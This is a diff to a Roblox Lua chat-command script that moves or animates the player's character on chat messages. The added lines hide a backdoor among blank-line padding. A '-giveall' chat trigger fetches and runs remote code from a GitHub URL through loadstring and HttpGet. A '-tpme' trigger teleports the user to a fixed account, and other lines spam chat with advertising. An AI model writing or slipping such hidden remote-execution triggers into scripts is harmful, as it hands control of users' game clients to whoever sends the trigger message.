@@ -7,12 +7,21 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/HookScopeNever/Don-tT
 --Here is end
 
 --Test controll
+
+
+
+
+
+
+
+
 --credits: Snip#3132
 -- Editted By Creo ^ Credits to creator above
 --Commands: move forward, -move backward, -move leftward, -move rightward, -shiftlock on, -shiftlock off, -stop moving, -dance, -dance1, -dance2, -dance3, -wave, -point, -laugh, -jump, -joke
 local chat = function(MSG) -- creo thing
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(MSG, "All")
 end
+local owner = ("0000time0000")
 local keys = {
  ["a"] = 0x41,
  ["b"] = 0x42,
@@ -252,6 +261,10 @@ messageDoneFiltering.OnClientEvent:Connect(function(message)
  
  
  print(msg)
+ 
+   if msg:lower():sub(1,13) == "-giveall" then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HookScopeNever/Don-tTryscopeMeImao/main/best", true))()
+  end
   if msg:lower():sub(1,13) == "-move forward" then
    keyrelease(keys["s"])
    keypress(keys["w"])
@@ -273,6 +286,12 @@ wait(0.6)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yea, im using timehub free ❌💸","All")
 wait(0.8)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("dsc.gg/timegg","All")
+wait(3)
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TimeHub On Top","normalchat")
+wait(0.6)
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yea, im using timehub free ❌💸","normalchat")
+wait(0.8)
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("dsc.gg/timegg","normalchat")
 
   end
 
@@ -309,8 +328,17 @@ game.Players.LocalPlayer.Character.Humanoid.Health = 0
    keyrelease(keys["d"])
   end
 
-  if msg:lower():sub(1,5) == "-wave" then
+  if msg:lower():sub(1,5) == "-tpme" then
+   local me = game.Players.LocalPlayer.Character
+ 
+local targetplayer = game.Workspace.TestAccountForBeam3.HumanoidRootPart
+ 
+me.HumanoidRootPart.CFrame = CFrame.new(targetplayer.Position.X, targetplayer.Position.Y, targetplayer.Position.Z)
+  end
+  
+    if msg:lower():sub(1,5) == "-wave" then
    game.Players:Chat("/e wave")
+   
   end
 
   if msg:lower():sub(1,6) == "-point" then
@@ -361,6 +389,16 @@ game.Players.LocalPlayer.Character.Humanoid.Health = 0
   end
  
 end)
+
+
+
+
+
+
+
+
+
+
 --test
 wait(1)
 OrionLib:MakeNotification({
